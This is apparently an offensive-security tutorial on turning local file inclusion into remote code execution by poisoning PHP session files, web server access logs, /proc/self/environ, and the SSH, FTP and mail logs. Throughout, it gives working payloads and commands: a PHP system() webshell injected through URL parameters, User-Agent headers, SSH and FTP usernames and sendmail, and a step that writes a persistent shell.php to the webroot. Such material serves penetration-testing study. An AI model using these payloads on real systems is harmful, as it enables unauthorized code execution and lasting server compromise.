# Log Poisoning

Log poisoning converts a read-only LFI into remote code execution by injecting PHP code into a file the server writes to automatically, then including that file through the LFI to trigger execution. The attack requires no file upload functionality and works against any execute-capable include function.

***

## PHP Session Poisoning

PHP stores session data in flat files on disk. The filename maps directly to the `PHPSESSID` cookie value with a `sess_` prefix:

```
Cookie: PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd
Session file: /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
Windows path: C:\Windows\Temp\sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

**Step 1: Read the session file through LFI to understand its structure:**

```
http://TARGET/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

A typical session file contains serialised PHP data:
```
page|s:6:"es.php";preference|s:2:"en";
```

The `page` value reflects whatever was passed in the `?language=` parameter on the previous request, meaning it is directly user-controlled. The `preference` value is set internally and cannot be influenced.

**Step 2: Confirm control by writing a test string:**

```
http://TARGET/index.php?language=session_poisoning
```

Re-reading the session file confirms `page` now contains `session_poisoning`.

**Step 3: Inject the webshell:**

```
http://TARGET/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

URL-decoded this is `<?php system($_GET["cmd"]); ?>`, which PHP writes directly into the session file under the `page` key.

**Step 4: Execute via LFI:**

```
http://TARGET/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

An important operational detail: every time you include the session file, the `page` value gets overwritten with the path to the session file itself on the next request. This means you need to re-poison the session before each command, or better, use the first command execution to write a persistent webshell to the webroot:

```
&cmd=echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
```

***

## Apache and Nginx Log Poisoning

Web server access logs record every incoming request including the `User-Agent` header, which is entirely attacker-controlled. Injecting PHP into the `User-Agent` writes it to the log file, and including that log through LFI executes it.

**Default log locations:**

| Server | Linux | Windows |
|--------|-------|---------|
| Apache access | `/var/log/apache2/access.log` | `C:\xampp\apache\logs\access.log` |
| Apache error | `/var/log/apache2/error.log` | `C:\xampp\apache\logs\error.log` |
| Nginx access | `/var/log/nginx/access.log` | `C:\nginx\log\access.log` |
| Nginx error | `/var/log/nginx/error.log` | `C:\nginx\log\error.log` |

**Step 1: Confirm read access through LFI:**

```
http://TARGET/index.php?language=/var/log/apache2/access.log
```

A readable log will display entries containing IP addresses, request paths, response codes, and User-Agent strings. Note that production logs can be several gigabytes in size. Including a large log file can crash the server process or cause significant delays, so test read access with a targeted curl request rather than loading it in a browser.

**Step 2: Inject PHP into the User-Agent:**

Using Burp Suite, intercept any request to the application and modify the `User-Agent` header:
```
User-Agent: <?php system($_GET['cmd']); ?>
```

Or send it directly via curl:
```bash
curl -s "http://TARGET/index.php" \
     -H 'User-Agent: <?php system($_GET["cmd"]); ?>'
```

The PHP payload is now written into the access log as part of that request's log entry.

**Step 3: Execute via LFI:**

```
http://TARGET/index.php?language=/var/log/apache2/access.log&cmd=id
```

**Permission differences between Apache and Nginx:**

Nginx log files are readable by low-privilege users like `www-data` by default, making Nginx log poisoning more reliable in practice. Apache log files are typically owned by `root` or the `adm` group and are not readable by `www-data` unless the server is misconfigured or running on an older distribution. If Apache log permissions block you, attempt the Nginx logs or move to the alternative poisoning targets below.

***

## /proc/ File Poisoning

The Linux [/proc/ virtual filesystem](https://man7.org/linux/man-pages/man5/proc.5.html) exposes process information including the User-Agent of the current request in some configurations. These files serve as an alternative when direct log access is blocked:

```
/proc/self/environ      # Environment variables of the current process
/proc/self/fd/0         # stdin of the current process
/proc/self/fd/1         # stdout
/proc/self/fd/N         # Open file descriptors (N typically 0-50)
```

`/proc/self/environ` sometimes contains the `HTTP_USER_AGENT` variable. Poisoning the User-Agent and then including this file can achieve the same result as log poisoning. The limitation is that these files are often only readable by the process owner or root, making this a backup technique rather than a primary approach.

***

## Extended Poisoning Targets

Any service that logs a value you control and whose log is readable via LFI is a viable target. The pattern is always: control the logged value, inject PHP, include the log.

**SSH log poisoning** (`/var/log/sshd.log` or `/var/log/auth.log`):
```bash
# The username field is logged on failed authentication attempts
ssh '<?php system($_GET["cmd"]); ?>'@TARGET
```

The invalid username gets written to the auth log, which is then included via LFI.

**FTP log poisoning** (`/var/log/vsftpd.log`):
```bash
ftp TARGET
# When prompted for username:
Name: <?php system($_GET["cmd"]); ?>
```

**SMTP log poisoning** (`/var/log/mail.log`):
```bash
# Send an email where the subject or body contains PHP code
# The mail log records the from address and sometimes headers
sendmail -v target@localhost <<< "<?php system(\$_GET['cmd']); ?>"
```

**Summary of poisoning targets:**

```
Session files      → /var/lib/php/sessions/sess_[PHPSESSID]
Apache access log  → /var/log/apache2/access.log
Nginx access log   → /var/log/nginx/access.log
Auth log           → /var/log/auth.log (poisoned via SSH username)
FTP log            → /var/log/vsftpd.log (poisoned via FTP username)
Mail log           → /var/log/mail.log (poisoned via email headers)
/proc/self/environ → Poisoned via User-Agent header
```

The generalised workflow is always the same regardless of the target log: identify a readable log file through LFI, find a field within that log that you control via a request parameter or protocol interaction, inject the PHP webshell into that field, and then include the log file through LFI while passing the `cmd` parameter.
